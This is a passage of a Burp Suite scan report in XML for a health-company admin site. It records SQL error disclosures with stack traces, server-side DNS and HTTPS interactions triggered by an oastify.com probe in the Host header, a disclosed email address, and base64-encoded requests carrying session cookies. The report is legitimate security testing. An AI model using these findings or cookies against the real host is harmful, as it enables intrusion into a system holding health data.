    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/3992]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5MiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBzY3JlZW5XaWR0aD0xMzY4OyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WDsgQVdTQUxCQ09SUz1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJQcm9maWxlLzM5OQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzUNCg0KU2F2ZT1TYXZlJmZpcnN0TmFtZT1ZWVkmbGFzdE5hbWU9Y3lwYXJ0YSZwaG9uZT0wMDAwMDAwMDAwJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OTozMCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODQ0DQpTZXQtQ29va2llOiBBV1NBTEI9UC9YLzJTMXg1YjB0ZmlXM3BRT1ZCTjNoeDhWeUI0QXc0Yll2a3plSGFsZFQyZi9rcmR3NzB0WXh0S3NnQmI5WHlLeW5BNlVBR2NCKzBXdlZMeUVDL0FnRE9ORklYU0c1MU1CYitLT3pKeGd2UTVaNVdoTlowc2FrcVlLZDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjMwIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPVAvWC8yUzF4NWIwdGZpVzNwUU9WQk4zaHg4VnlCNEF3NGJZdmt6ZUhhbGRUMmYva3JkdzcwdFl4dEtzZ0JiOVh5S3luQTZVQUdjQiswV3ZWTHlFQy9BZ0RPTkZJWFNHNTFNQmIrS096SnhndlE1WjVXaE5aMHNha3FZS2Q7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OTozMCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnLCAwLCAxMCwgJycsIDAsICwgJycsICcyMDI0LTEyLTE0IDIzOjU5OjMwJywgKScgYXQgbGluZSAyIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjMyClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgzMik6IG15c3FsaS0mZ3Q7cXVlcnkoJ2luc2VydCBpbnRvIHVzZS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDQzOSk6IERiVXRpbDo6aW5zZXJ0UmVjb3JkKE9iamVjdChteXNxbGkpLCAnaW5zZXJ0IGludG8gdXNlLi4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoMTI1KTogVXNlci0mZ3Q7c2F2ZSgpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnMzk5MicsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjMyPC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvYmhpMiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBzY3JlZW5XaWR0aD0xMzY4OyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WDsgQVdTQUxCQ09SUz1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJQcm9maWxlLzM5OQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzUNCg0KU2F2ZT1TYXZlJmZpcnN0TmFtZT1ZWVkmbGFzdE5hbWU9Y3lwYXJ0YSZwaG9uZT0wMDAwMDAwMDAwJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OTozMCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNjk1DQpTZXQtQ29va2llOiBBV1NBTEI9c1FYZ24yNklUYVlrNHp6VW9uWDRLdlZvZ3ZVN0VGQWtZU2tLQnI4TTZPOVJnYjU3ZXRyeDNKbEVFUWNsZ2NyNWhZRWJGN0w0TmtybEorZjZCYk9YQ0lrM1NheVhORkFDTEszVzdvV2k4dDVtUXVFVDR2MFBzQkJ0bTBwNDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjMwIEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPXNRWGduMjZJVGFZazR6elVvblg0S3ZWb2d2VTdFRkFrWVNrS0JyOE02TzlSZ2I1N2V0cngzSmxFRVFjbGdjcjVoWUViRjdMNE5rcmxKK2Y2QmJPWENJazNTYXlYTkZBQ0xLM1c3b1dpOHQ1bVF1RVQ0djBQc0JCdG0wcDQ7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OTozMCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJ2JoaTInIGluICd3aGVyZSBjbGF1c2UnIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJ2JoaTInKQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMDMpOiBVc2VyUHJvZmlsZUNvbnRyb2xsZXItJmd0O3NhdmVFbnRpdHkoJ2JoaTInLCAnVXNlclByb2ZpbGUnLCBBcnJheSwgQXJyYXkpCiM0IHttYWlufQogIHRocm93biBpbiA8Yj4vdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDwvYj4gb24gbGluZSA8Yj4yNDwvYj48YnIgLz4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7966765171782541312</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>828n89too5vjg3pglnhg6f6ix933rvojhi58sygn.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDgyOG44OXRvbzV2amczcGdsbmhnNmY2aXg5MzNydm9qaGk1OHN5Z24ub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>167.99.160.10</originIp>
      <time>2024-Dec-15 00:46:15.199 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>828n89too5vjg3pglnhg6f6ix933rvojhi58sygn.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>3795296311251340288</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>828n89too5vjg3pglnhg6f6ix933rvojhi58sygn.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDgyOG44OXRvbzV2amczcGdsbmhnNmY2aXg5MzNydm9qaGk1OHN5Z24ub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:46:16.123 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDgyOG44OXRvbzV2amczcGdsbmhnNmY2aXg5MzNydm9qaGk1OHN5Z24ub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1na3BnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>5328061788655526912</serialNumber>
    <type>6291968</type>
    <name><![CDATA[Email addresses disclosed]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399/PUT]]></path>
    <location><![CDATA[/UserProfile/399/PUT]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.</p>
<p>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Consider removing any email addresses that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</p>
<p>To reduce the quantity of spam sent to anonymous mailbox addresses, consider hiding the email address and instead providing a form that generates the email server-side, protected by a CAPTCHA if necessary. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure">Web Security Academy: Information disclosure</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following email address was disclosed in the response:<ul><li>bahaa@cyparta.com</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[bahaa@cyparta.com]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5L1BVVCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9djlsa3RmcDI5NG82YnYycGwwOXB0anE2bTg7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPWljWXRwVnYxUlJ1alZmei8xTmcrSWFOb0ZWTTBBK3NwWFJFTkhtcUF0bUZCcDVkVEtGQzNFbGRyNE90Zm9DWUJYQ08xZTR4NXd0cUJDU2o3c0t1M3piRGtuNXpOaTI0ZHdJT1kxRUhERVQxbmtCR2NqdXZYMkp4WmdwYWo7IEFXU0FMQkNPUlM9aWNZdHBWdjFSUnVqVmZ6LzFOZytJYU5vRlZNMEErc3BYUkVOSG1xQXRtRkJwNWRUS0ZDM0VsZHI0T3Rmb0NZQlhDTzFlNHg1d3RxQkNTajdzS3UzemJEa241ek5pMjRkd0lPWTFFSERFVDFua0JHY2p1dlgySnhaZ3Bhag0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogMA0KDQo=]]></request>
